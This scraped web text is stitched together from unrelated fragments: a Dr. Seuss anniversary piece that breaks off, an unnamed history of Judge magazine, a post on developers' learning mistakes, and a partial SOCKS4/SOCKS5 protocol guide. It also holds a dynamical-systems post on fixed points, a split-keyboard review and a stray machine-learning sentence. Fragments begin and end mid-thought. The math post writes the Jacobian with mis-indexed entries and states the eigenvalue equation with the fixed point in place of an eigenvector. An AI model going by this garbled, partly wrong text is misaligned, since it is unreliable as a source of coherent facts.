<p><br>Today marks the 20th Anniversary of the National Education Association’s (NEA) “Read Across America” Day — an event observed every year on Dr. Seuss’s birthday. It is the largest celebration of reading in America, with over 45 million students, parents, teachers, libraries and community centers participating. Dr. Seuss books and activities are central to the annual celebration — schools have Dr. Seuss-themed festivals, eat “green eggs and ham”, and get dressed up as their “favorite Dr. Seuss character”. The NEA sells Dr. Seuss merchandise through their <a href="http://www.raastore.com/site/" target="_blank"><em>website</em></a>, and kids across America will be seen wearing the <a href="http://www.readacrossamerica.org/pledges/" target="_blank"><em>red and white striped hats</em></a> from the book, The Cat in the Hat.</p>
<p>Theodor Seuss Geisel, aka “Dr. Seuss,” has sold over 600 million copies of his books and is a widely celebrated and beloved children’s book author. Most people in America, and even globally (Dr. Seuss books are translated into 20 languages), know of his classic titles. What it not as well known (or acknowledged), is his work publishing racist and xenophobic political cartoons.<br>
</p>








<hr>

<p><br>It was launched by artists who had seceded from its rival Puck. The founders included cartoonist James Albert Wales, dime novels publisher Frank Tousey and author George H. Jessop.</p>
<p>The first printing of Judge was on October 29, 1881, during the Long Depression. It was 16 pages long and printed on quarto paper. While it did well initially, it soon had trouble competing with Puck. William J. Arkell purchased the magazine in the middle 1880s. Arkell used his considerable wealth to persuade the cartoonistss Eugene Zimmerman (“Zim”) and Bernard Gillam to leave Puck. A supporter of the Republican Party, Arkell persuaded his cartoonists to attack the Democratic administration of Grover Cleveland. With G.O.P. aid, Judge boomed during the ’80s and ’90s, surpassing its rival publication in content and circulation. By the early 1890s, the circulation of the magazine reached 50,000.</p>
<p>Under the editorial leadership of Isaac Gregory, 1886–1901, Judge allied with the Republican Party and supported the candidacy of William McKinley largely through the cartoons of leading cartoonist Grant E. Hamilton. Circulation for Judge was about 85,000 in the 1890s. By the 1900s, the magazine had become successful, reaching a circulation of 100,000 by 1912.

They are not optional extras but are vital to the successful achievement of their career goals. However, there are some common learning mistakes that developers often make regardless of where they are currently in their careers.</p><p id="ed23">The common learning mistakes are:</p><ol><li id="bcd6">Not having a learning plan.</li><li id="cb91">Not setting a clear end goal.</li><li id="fd0d">Choosing too broad a topic.</li><li id="406e">Having a consumption overload.</li><li id="ffb4">Not keeping track of progress.</li></ol></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of person on laptop" src="https://miro.medium.com/max/11520/0*ZdqNg4jjyniaoCe2" width="5760" height="3840" srcset="https://miro.medium.com/max/552/0*ZdqNg4jjyniaoCe2 276w, https://miro.medium.com/max/1104/0*ZdqNg4jjyniaoCe2 552w, https://miro.medium.com/max/1280/0*ZdqNg4jjyniaoCe2 640w, https://miro.medium.com/max/1400/0*ZdqNg4jjyniaoCe2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ZdqNg4jjyniaoCe2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@chuklanov?utm_source=medium&amp;utm_medium=referral" rel="noopener">Avel Chuklanov</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="7042">There is a saying that if you fail to plan, you plan to fail, and this applies to learning too. Sometimes, developers get impatient and plunge straight into active learning without any preparation. For example, a developer might say they want to learn a JavaScript framework, React. They may start reading tutorials about React without any outline on what areas they want to focus on, or how to get to their end goal: being able to write React applications.</p><p id="6916">The better way of learning, in this case, will be looking at the official documentation, going through the step-by-step approach from main concepts to advanced guides and API references, and creating a sample application in React. After this, looking at and learning from other examples out there and setting SMART goals for each stage of their learning will be helpful. S.M.A.R.T. goals are good goals because they’re specific, measurable, achievable, realistic, and time-bound.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a bullseye" src="https://miro.medium.com/max/10336/0*ycA_TuwSGX-DwcOr" width="5168" height="3448" srcset="https://miro.medium.com/max/552/0*ycA_TuwSGX-DwcOr 276w, https://miro.medium.com/max/1104/0*ycA_TuwSGX-DwcOr 552w, https://miro.medium.com/max/1280/0*ycA_TuwSGX-DwcOr 640w, https://miro.medium.com/max/1400/0*ycA_TuwSGX-DwcOr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ycA_TuwSGX-DwcOr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@enginakyurt?utm_source=medium&amp;utm_medium=referral" rel="noopener">engin akyurt</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1985">There are so many new technologies and new ways of doing things in the <a href="https://hackernoon.com/tagged/software-development" rel="noopener">software development</a> industry. Don’t get me wrong; I believe continuous learning is a good thing. You can only grow your skill set and knowledge if you are open to learning. However, if a developer has too much FOMO (Fear of Missing Out) about learning every new thing that they hear about — then there will be no time left for being productive or putting her knowledge and skills to good use.</p><p id="bcfd">Before you learn something, I’d encourage you to think about why you’re learning it — and where and how you’ll use your newly learned knowledge or skill. For example, if you’re a backend developer, and you’re learning JavaScript, you’re doing so because your goal is to move to full-stack development. Or, if you’re a DevOps and learning AWS, you might be doing so to increase your chance of a new employment opportunity at a company that uses AWS.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of the sea and sky." src="https://miro.medium.com/max/12408/0*bfFnMGfMLjIakmKq" width="6204" height="4136" srcset="https://miro.medium.com/max/552/0*bfFnMGfMLjIakmKq 276w, https://miro.medium.com/max/1104/0*bfFnMGfMLjIakmKq 552w, https://miro.medium.com/max/1280/0*bfFnMGfMLjIakmKq 640w, https://miro.medium.com/max/1400/0*bfFnMGfMLjIakmKq 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bfFnMGfMLjIakmKq?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mattmaber?utm_source=medium&amp;utm_medium=referral" rel="noopener">Matthew Maber</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="aa08">Ever heard of the saying — everything but the kitchen sink? Sometimes, developers get too greedy with wanting to know everything about a topic that they fail to narrow down and, instead, set a very broad learning objective. How broad is too broad, I hear you ask. In my opinion, a topic is too broad if you can’t articulate your learning outcomes in a few words to another developer.</p><p id="6bd4">Learning outcomes are statements about knowledge or skill a developer should acquire by the end of their learning journey on a specific topic. Sure, you can learn about a particular topic forever, but there must be a point when you decide for yourself that it is enough, for now. Enough for you to feel confident in working toward and achieving your end goal.</p><p id="dc7e">For example, here are some learning outcomes for learning React Javascript framework.</p><p id="b7ae">By the end of my learning program, I should be able to create a new React app from scratch that can:</p><ul><li id="db4c">Consume JSON payload in a REST API</li><li id="54a3">Refresh the content of the app every <code>x</code> mins</li><li id="d377">Navigate to different screens</li><li id="2fa8">Remember the last screen I visited before (if any)</li><li id="24ff">Be Unit-tested</li></ul><p id="6ee5">Note that the above learning outcomes are not too specific or detailed (like creating a component in JSX syntax, for example) because you don’t know about the ins and outs of the React framework yet. They are not too broad either; there is a clear outcome for each statement instead of just a broad, generic one, like “Create a React app.”</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of multiple waterfalls" src="https://miro.medium.com/max/9216/0*YWDZfhREIQqoJ_fy" width="4608" height="3008" srcset="https://miro.medium.com/max/552/0*YWDZfhREIQqoJ_fy 276w, https://miro.medium.com/max/1104/0*YWDZfhREIQqoJ_fy 552w, https://miro.medium.com/max/1280/0*YWDZfhREIQqoJ_fy 640w, https://miro.medium.com/max/1400/0*YWDZfhREIQqoJ_fy 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YWDZfhREIQqoJ_fy?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mikeanywhere?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike Lewis HeadSmart Media</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="c174">Tutorial fatigue — it’s real. If you think you’re learning something by going through endless books, videos, and tutorials then you’re simply wasting your time. Pick a few options, be it books, videos, or any other format, and stick with them. Chances are what you learn in a video will be very similar to another tutorial that you’re reading on the same topic.</p><p id="7c5d">To give you another example, I did a quick search on Amazon about React Javascript framework, and there were about 700 books on the topic — a few of them even have the exact same book title, <em>Learning React</em>. There is no way you can get through all the books, and even if you did, it is no guarantee that you’ll become an expert at React, or is it a good use of your time.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a loading screen" src="https://miro.medium.com/max/12096/0*5fuYpC-mFVleIePR" width="6048" height="4024" srcset="https://miro.medium.com/max/552/0*5fuYpC-mFVleIePR 276w, https://miro.medium.com/max/1104/0*5fuYpC-mFVleIePR 552w, https://miro.medium.com/max/1280/0*5fuYpC-mFVleIePR 640w, https://miro.medium.com/max/1400/0*5fuYpC-mFVleIePR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*5fuYpC-mFVleIePR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mike_van_den_bos?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike van den Bos</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a189">Having a clear plan and a definite goal is good, but they serve little purpose if you’re not keeping track of how you’re progressing — and if you’re reaching your goals. Review your progress every fortnight, or at least every month, and ask yourself whether you are heading in the right direction.</p><p id="568e">I recommend setting up a reminder in your calendar to review your progress at a regular interval at the start of your learning journey — so you don’t forget about it. If you’re not achieving your goals timely, it’s a chance for you to understand where you may be struggling with and revise your plan. On the other hand, if you’re achieving your goals, celebrate them to keep your momentum and motivation going.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of an apple, some book, crayons" src="https://miro.medium.com/max/7906/0*WItSN7T0lYfj_6P1" width="3953" height="2791" srcset="https://miro.medium.com/max/552/0*WItSN7T0lYfj_6P1 276w, https://miro.medium.com/max/1104/0*WItSN7T0lYfj_6P1 552w, https://miro.medium.com/max/1280/0*WItSN7T0lYfj_6P1 640w, https://miro.medium.com/max/1400/0*WItSN7T0lYfj_6P1 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*WItSN7T0lYfj_6P1?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@element5digital?utm_source=medium&amp;utm_medium=referral" rel="noopener">Element5 Digital</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1ed7">In this day and age, being an efficient learner gives you an edge and sets you up for your career success. I’m a firm believer that you can get better at anything in life if you take the time to understand the process — and have the willingness to improve. Learning is no exception. It is a skill that can be improved with practice. And knowing what not to do is sometimes as important as knowing what to do when it comes to learning.

<![CDATA[Implementer's Guide to Socks (Protocol)]]>

March 4, 2021 | https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html | <a href="https://web.archive.org/web/*/https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Yesterday I was verifying that the SOCKS test suite of 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	is working and I realized that writing failsafe tests are not
	as easy as someone might think. So here's my write-up about
	the SOCKS protocol.
</p>
<p>
	The problem with SOCKS in a nutshell is that it is not as well
	documented as someone might think.
</p>
<p>
	Most people are even unaware of the role that a SOCKS proxy plays
	in between network connections and therefore don't know what exactly
	a SOCKS proxy can or cannot do in regards to blocking ads and malicious
	domains.
</p>
<p>
	So I thought that a reference-class article for SOCKS4 and SOCKS5
	would be nice, documenting its quirks and common pitfalls while
	implementing those protocols.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides are
	implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>SOCKS</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc1928">RFC1928</a> 
	 and
	 <a href="https://tools.ietf.org/html/rfc1929">RFC1929</a> 
	 and didn't change since
	 <code>1996</code>
	 so it's somewhat safe to assume that this is the final version
	of the network protocol.
</p>
<p>
	The SOCKS protocol in general and its role is pretty much what telephone
	operators did in the past. A client connects to the SOCKS proxy and
	requests to connect to a specific target. The proxy tries to connect
	to the target, and if it succeeds reaches through the connection to the
	client.
</p>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Here's the connection handle, any further data will be dispatched through automatically.
</pre>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Sorry, the given target is not reachable. Please try again later.
Proxy:  *hangs off the phone* Beep Beep Beep.
</pre>
<p>
	As both 
	 <code>SOCKS4</code>
	 and 
	 <code>SOCKS4a</code>
	 were proprietary protocols, they didn't
	have any RFC. 
	 <code>SOCKS5</code>
	 is referring a lot the 
	 <code>SOCKS4</code>
	 protocol and
	its featureset, so reading the RFC is quite complicated if you don't
	know what the older protocol versions actually did feature-wise.
</p>
<p>
	Usually though, most clients and servers that claim to support SOCKS5
	actually only support the 
	 <code>user</code>
	 and 
	 <code>password</code>
	 authentication, not
	the 
	 <code>IPv6</code>
	 or 
	 <code>DNS/UDP</code>
	 related features that come with it.
</p>
<p>
	This implementation will focus mostly on the 
	 <code>IPv4</code>
	 and 
	 <code>IPv6</code>
	differences and will - for the sake of simplicity - only support 
	 <code>TCP</code>
	based connections.
</p>
<p>
	The 
	 <code>SOCKS4</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
</ul>
<p>
	The 
	 <code>SOCKS4a</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> is broken in practice (no password)</li>
</ul>
<p>
	The 
	 <code>SOCKS5</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP and UDP)</li>
	<li>connects to <code>IPv6</code> (TCP and UDP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> and <code>password</code></li>
</ul>
<h2>SOCKS Protocol and Network States</h2>
<p>
	Describing SOCKS data frames can be kind of complicated, because the
	interpretation of a SOCKS frame is different depending on its network
	state. So I'm trying to document the different network states first,
	so that you know what kind of states on both sides are possible.
</p>
<p>
	We are also going to completely ignore the 
	 <code>SOCKS authentication methods</code>

<h3>SOCKS Version 4</h3>
<p>
	The SOCKS 
	 <b>Version 4</b>
	 network flow looks like this
	:
</p>
<ul>
	<li>Client sends Connection Request Frame</li>
	<li>Server responds with a Status Frame</li>
</ul>
<p>... and that's pretty much it. Super simple.</p>
<p>
	 <b>SOCKS Version 4 Connection Request Frame</b>
	:
</p>
<pre>+---------+---------+----+----+----+----+----+----+----+----+....+----+
| VERSION | COMMAND | DSTPORT |      DSTIP        | USERID       |NULL|
+---------+---------+----+----+----+----+----+----+----+----+....+----+
     1         1         2              4           variable       1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents the <code>SOCKS command</code> , which can be either of the Commands explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
	<li><code>USERID</code> (variable byte length, followed by a <code>NULL</code> terminator byte) represents an authentication mechanism for a user-login; but without a password.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Connection Status Frame</b>
	:
</p>
<pre>+---------+--------+----+----+----+----+----+----+
| VERSION | STATUS | DSTPORT |      DSTIP        |
+---------+--------+----+----+----+----+----+----+
     1         1        2              4
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>STATUS</code> (1 byte) represents the <code>SOCKS status</code> , which can be either of the Status explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes</b>
	:
</p>
<ul>
	<li><code>0x5A</code> Request granted.</li>
	<li><code>0x5B</code> Request rejected or failed.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes for Authentication Mechanism</b>
	:
</p>
<p>(I would not recommend to implement them)</p>
<ul>
	<li><code>0x5C</code> Request failed because Client's <code>identd</code> is not reachable from server.</li>
	<li><code>0x5D</code> Request failed because Client's <code>identd</code> could not confirm the User ID.</li>
</ul>
<h3>SOCKS Version 5</h3>
<p>
	 <b>Important</b>
	:
	 The SOCKS Version 5 protocol is different in
	its network flow and data frame structure; and it has a
	reserved byte with a 
	 <code>0x00</code>
	 value where the SOCKS Version 4
	protocol would otherwise expect a non-NULL byte data.
</p>
<p>
	Additionally, the order of 
	 <code>Destination Port</code>
	 and 
	 <code>Destination Address</code>
	is different from the order specified in SOCKS Version 4.
</p>
<p>
	The SOCKS 
	 <b>Version 5</b>
	 network flow looks like this
	:
</p>
<ol>
	<li>Client and Server authenticate via handshake mechanism.</li>
	<li>Server authenticates or responds with error message.</li>
	<li>Client requests to connect or bind to an IPv4, IPv6 or domain.</li>
	<li>Server responds with connection status.</li>
</ol>
<p>
	 <b>SOCKS Version 5 Handshake Request Frame</b>

<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>NMETHODS</code> (1 byte) represents the byte length of the following encoded <code>METHOD</code> s.</li>
	<li><code>METHODS</code> (variable byte length) represents the encoded SOCKS methods.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Handshake Methods</b>
	:
</p>
<ul>
	<li><code>0x00</code> represents No Authentication required.</li>
	<li><code>0x01</code> represents <code>GSSAPI</code> which is a "secure" context as defined per <a href="https://tools.ietf.org/html/rfc1961">RFC1961</a> .</li>
	<li><code>0x02</code> represents <code>username/password</code> plaintext authentication.</li>
	<li><code>0x80</code> to <code>0xFE</code> are reserved for private methods, but are never used in practice.</li>
	<li><code>0xFF</code> represents No Acceptable methods (in a response).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Request</b>
	:
</p>
<p>
	After the Client and Server have negotiated an Authentication Method,
	the Client sends a Connection Request Frame to the Server.

In this post, I will discuss fixed points for a general case of a continuous-time $n$-dimensional system.</p><h4 id="fixed-point">Fixed point</h4><p>Just to reiterate, if the ordinary differential equation (ODE) in $\eqref{eq:1}$ represents a dynamical system:</p>\[\dot x = f(x) \label{eq:1}\]<p>Fixed points of this system are given by the roots of the equation $\eqref{eq:2}$:</p>\[\begin{equation} \dot x = f(x) = 0 \label{eq:2} \end{equation}\]<h2 id="fixed-points-of-multi-dimensional-system">Fixed points of Multi-dimensional system</h2><p>My <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a> only explained the definition of fixed point and provided an example with a scalar-valued dynamical system. Now, lets discuss a case of multi-dimensional ODE.</p><p>We will start with the system given by equation $\eqref{eq:3}$:</p>\[\mathbf{\dot x} = \mathbf{f(x)} \label{eq:3}\]<p>where $\mathbf{f}$ is a vector-valued function, $\mathbf{x}$ and $\mathbf{\dot x}$ are $n$-dimensional vectors:</p>\[\mathbf{x, \dot x} \in \mathcal{R}^{n} \label{eq:4}\]<p>We find the fixed points (a.k.a. equilibrium states) of the system by following $\eqref{eq:2}$:</p>\[\mathbf{\dot x_{eq}} = \mathbf{f}(\mathbf{x_{eq}}) = \mathbf{0} \label{eq:5}\]<p>The roots of $\eqref{eq:5}$ will give us the value of $\mathbf{x_{eq}}$, i.e., fixed points of our multi-dimensional system.</p><h2 id="stable-and-unstable-fixed-points">Stable and Unstable Fixed Points</h2><p>We analyzed the system in a one-dimensional case (<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">here</a>) using a small perturbation $\delta$ at the equilibrium condition of the system. We will follow the similar procedure here as well.</p><p>We evaluated $\mathbf{f}^{\prime}\mathbf{(x)}$ at $\mathbf{x_{eq}}$ to see if our fixed point is stable or unstable. In case of one-dimensional system, it was easy since $f^{\prime}(x_{eq})&gt;0$ is unstable fixed point $x_{eq}$ while it is stable when $f^{\prime}(x_{eq})&lt;0$. In case of high-dimensional system, we cannot do this.</p><p>To analyze the behavior of our $n$-dimensional system at $\mathbf{x_{eq}}$, we will introduce the perturbation $\mathbf{\delta x}$ at $\mathbf{x_{eq}}$. Thus, we end up with the following:</p>\[\begin{align} \mathbf{\dot x_{eq} + \dot {\delta x}} &amp;= \mathbf{f(x_{eq}+\delta x)} \label{eq:6} \end{align}\]<p>Using Taylor expansion on $\eqref{eq:6}$:</p>\[\begin{align} \mathbf{\dot x_{eq} + \delta \dot x = f(x_{eq}) + f^{\prime}(x_{eq}) \delta x + f^{\prime \prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \label{eq:7} \end{align}\]<p>But, we know at fixed points, equation $\eqref{eq:5}$ holds and thus, $\eqref{eq:7}$ reduces to $\eqref{eq:8}$.</p>\[\begin{align} \mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + f^{\prime\prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \end{align}\] \[\mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + H.O.T. \label{eq:8}}\]<p>We can ignore the higher order terms $\mathbf{H.O.T.}$ for values of $\mathbf{\delta{x}}$ close to $\mathbf{0}$, resulting in equation $\eqref{eq:9}$.</p>\[\begin{align} \mathbf{\delta \dot x = f^{\prime}(x_{eq}) \delta x \label{eq:9}} \end{align}\]<p>$\mathbf{f}^{\prime}\mathbf{(x)}$ is the Jacobian of $\mathbf{f(x)}$ at $\mathbf{x_{eq}}$, i.e., a <strong>linear approximation</strong> of our dynamical system $\mathbf{f(x)}$ near $\mathbf{x_{eq}}$ (you can refer <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/#jacobian-aka-derivative-of-vector-valued-function">this</a> for further details on Jacobian).</p>\[\begin{align} \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \left[ \frac{\partial\mathbf{f}}{\partial x_{1}}, \frac{\partial\mathbf{f}}{\partial x_{2}}, \dots, \frac{\partial\mathbf{f}}{\partial x_{n}} \right] \label{eq:11}\\ \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \begin{bmatrix} \frac{\partial{f_{1}}}{\partial x_{1}} &amp; \frac{\partial{f_{2}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \vdots &amp; \ddots &amp; \ddots &amp; \vdots \\ \frac{\partial{f_{n}}}{\partial x_{1}} &amp; \frac{\partial{f_{n}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \end{bmatrix} \label{eq:12} \end{align}\]<p>Using this Jacobian, equation $\eqref{eq:12}$, at our fixed point $\mathbf{x_{eq}}$ for the dynamical system under consideration, we can calculate its <a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors"><strong>eigenvalues</strong></a> and interpret the results of the fixed point.</p><p>Therefore, we find the eigenvalues for equation $\eqref{eq:13}$,</p>\[\begin{align} \mathbf{f}^{\prime}(\mathbf{x_{eq}}) \mathbf{x_{eq}} = \lambda \mathbf{x_{eq}} \label{eq:13} \end{align}\]<p>Here, $\lambda$ denotes the eigenvalue of the system. The roots of $\eqref{eq:13}$ are the eigenvalues the dynamical system at the fixed point $\mathbf{x}=\mathbf{x_{eq}}$.</p><h3 id="eigenvalue-interpretation-">Eigenvalue interpretation <a name="eigen_value_interpretation"></a></h3><p>For a continuous-time nonlinear dynamical system given by $\eqref{eq:3}$, the eigenvalues $\lambda$ that are found as roots of equation $\eqref{eq:13}$ can be interpreted as:</p><ul><li>If any of the eigenvalues have a real part $Re(\lambda)&gt;0$: $\mathbf{x_{eq}}$ is an unstable fixed point.</li><li>If all $Re(\lambda)&lt;0$: $\mathbf{x_{eq}}$ is a stable fixed point.</li><li>If $\lambda=0$: $\mathbf{x_{eq}}$ is a neutral fixed point.</li><li>If eigenvalues $\lambda$ are complex conjugates, i.e., $Im(\lambda) \ne 0$: The dynamical system has oscillatory behavior around the fixed point.</li></ul><h3 id="important-points-to-note-regarding-this-article">Important points to note regarding this article</h3><p>In this post, we discussed a general case of interpreting the fixed points of a dynamical system. By general, I mean $\mathbf{f(x)}$ is a non-linear, continuous-time vector-valued function representing a dynamical system. Below are certain points one should note about any non-linear dynamical system:</p><ul><li>We assumed that the system is non-linear and linearized it using Taylor series expansion near its fixed point (a.k.a. equilibrium).</li><li>We evaluated the stability of a fixed point <strong>near</strong> the equilibrium condition by perturbing the system ($\mathbf{x_{eq}}+\mathbf{\delta x}$).</li><li>This approach of interpreting the stability of the system by linearizing it near the equilibrium <strong>does not tell much</strong> about a system’s asymptotic behavior at large.<ul><li>We only understand how the system behaves <strong>locally</strong> or <strong>in the neighborhood of the fixed points</strong>.</li></ul></li><li>In practical or real-world systems, it may not be possible to interpret the global stability characteristics of the system. Thus, the stability analysis around the neighborhood of the fixed point is useful for many practical applications such as sustaining a non-linear system’s state near or at the fixed point.</li><li>In general, global asymptotic behaviors of any non-linear dynamical system can be complex and there are no systematic methods to predict and analyze such behaviors.</li></ul><h3 id="references-and-further-readings">References and Further Readings:</h3><ul><li>Deshpande, A.

    <div>
      <p>In December of 2018 I finally received my UHK after months of waiting.</p>

<p>After using it daily since, I’m 100% convinced that the UHK is worth the asking price, probably more, and I’m happy that I got it at an early adopter discount.</p>

<p>Currently at $275 USD it’s definitely priced like the split ergonomic keyboard that it is, but what I think makes this one worth that is the open source, hackable nature of the keyboard.</p>

<p>Here’s my thoughts after using it as my daily driver for many months,</p>



<p>At first, I wasn’t a complete believer in Kailh keyswitches, but they’ve held up very well and show no signs of losing their feel. Still prefer Cherry for the desktop fullsize keyboards at home, but on the go and around school I’ve still had a good experience with these switches.</p>

<p>For some reason, they offered Cherry Clear and Cherry Green, no other Browns besides Kailh. Since I was planning on using this board to take notes in class, low noise was a high priority.</p>

<p>After a month or two, the switches were still a bit loud to use for notes in quiet lectures, so I bought and installed some generic o-rings which helped to reduce the keycap to board noise, but the springback action was still tell-tale sound of a mechanical keyboard.</p>

<p>Overall the feel of of the keyboard has been excellent and there’s been no hunting for keys as everything is exactly where I expect it to be.</p>



<p>The #1 eye-catching feature is for sure the splitting action.</p>

<p>I pull it out of a carrying case in one piece, and it looks whole, then it “appears I just rip my keyboard in half” as one fellow student commented.</p>

<p>But the aesthetics of the keyboard are nothing compared to how much better my carpal tunnel syndrome improved since using the UHK in place of my laptop keyboard. In fact, the primary reason I bought the UHK was to deal with carpal tunnel and I’m impressed how I’ve recovered without losing any real productivity.</p>

<p>I suspect the largest contributing factor to my development of CT was the usage of the trackpad on my laptop. Having to twist my hand and finger to move from keyboard use to having my thumb at the nearest edge of the laptop for pressing mouse buttons was likely the repetitive strain that triggered it.</p>

<p>While split, I never need to move my wrists, instead, I move the keyboard so that it’s exactly where my hands want to rest naturally. Problem solved.</p>



<p><img src="https://unhexium.net/images/uhk/desk1cut.jpg" alt=""></p>

<p>While splitting is certainly the most eye-catching features of the UHK, the LED display and steel plate construction also make it look (and feel) very premium.</p>

<p>You can of course order different colors of cases, mine being red, but the option exists such that I could easily grab a second case and customize it with paint or other mods.</p>

<p>In the future I will likely switch out the cable and keycaps to suit whatever design preferences I might have accumulated then.</p>



<p>In the first month of usage I had to change the ordering of the bottom modifier keys in order to reduce the reach strain from my most common shortcuts, I currently have them laid out as:</p>

<div><div><pre><code>Ctrl Super Fn Alt Mod || Space Super Alt Fn Ctrl
</code></pre></div></div>

<p>The goal here was to keep Super close to the right thumb and Alt close to the left thumb, because <code>Super-</code> is my window management base on Pop_OS! and Alt is used for switching terminal panes (where the right hand applies arrow keys I/HJKL) and managing textual multi-cursor.</p>

<p>It was super easy to just pop the keys off, rearrange, and reconfigure in UHK Agent.</p>

<p>I doubt I’m in the majority here, but when I touch type I used to hit the <code>Y</code> key with my left hand, since the UHK though it’s forced me to fix that habit and use the closer hand.</p>



<p>Currently my biggest gripe out of the whole experience is the mini USB connector method.</p>

<p>The connector itself is better than micro USB, but the placement of the connector underneath the top flange should have a better method of securing it instead of a simple cable pinch hole. The cable almost never stays stuck in the hole and often just causes more stress as a bend point.</p>

<p>I would love a switch to type-C with a latch mechanism, or even just keeping the connector outward facing like the RJ11 bridge would be fine.</p>

<p>After the connector, my only other problem is that the bridge cable gets squished whenever I place the keyboard inside a sleeve. I can’t immediately come up with a solution for this, since the extra slack in the already curled cable is definitely needed, but you should note to buy a case with a little more room vertically if you don’t want a squished looking bridge cable.</p>

<p><em>Machine learning has emerged as a must-have tool for any serious data team: augmenting processes, generating smarter and more accurate predictions, and generally improving our ability to make use of data.</em></p>



